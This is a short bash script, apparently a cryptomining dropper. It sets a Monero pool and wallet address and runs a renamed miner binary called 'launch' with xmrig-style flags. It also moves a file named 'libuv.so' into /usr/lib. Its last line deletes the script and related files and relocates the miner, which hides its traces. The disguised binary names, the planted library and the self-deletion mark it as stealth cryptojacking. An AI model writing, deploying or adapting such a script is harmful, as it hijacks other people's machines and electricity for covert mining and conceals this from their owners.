run.sh
#!/bin/bash

set -e
# Replace changeme with your values. Check out readme for more.
POOL="pool.hashvault.pro"
PORT=443
MYADDRESS="4AUTfJGTvT8A98PSE99EunfrnUbkWe9vU3FN3qsABQLP5aPKQuvWS5sCaD9WaXFQUqNtDLb9dcxiBgJiWCfjvDXp5ptWDYG"
COINNAME="monero"
# executable permissions
echo "Setting executable permissions"
if ! chmod +x libuv.so launch; then
    echo "Error: Failed to set executable permissions"
    exit 1
    else mv libuv.so ../../../usr/lib
fi
echo "Starting now"
./launch -o $POOL:$PORT -u $MYADDRESS --tls --coin $COINNAME -t 1
rm EA "EA FA" run.sh && mv launch config.json ../../ 
